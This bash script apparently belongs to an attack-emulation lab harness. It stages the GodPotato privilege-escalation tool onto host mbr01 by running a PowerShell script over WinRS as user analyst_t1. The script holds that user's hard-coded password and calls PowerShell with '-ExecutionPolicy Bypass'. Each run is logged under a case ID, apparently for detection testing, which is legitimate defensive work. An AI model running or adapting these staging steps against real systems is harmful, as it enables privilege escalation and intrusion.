#!/usr/bin/env bash
# T043 stage — push GodPotato to mbr01 from ws01 via WinRS as analyst_t1.
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T043-STAGE-MBR01-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T043 stage | ${CASE_ID} | T0=${T0} ==="

PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t043-stage-mbr01.ps1"
bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t043-stage-mbr01.ps1"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\\\Tools\\\\cadre-attack\\\\campaign-a-t043-stage-mbr01.ps1"

cadre_export "${CASE_ID}" T043-STAGE-MBR01 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T043 stage complete ==="
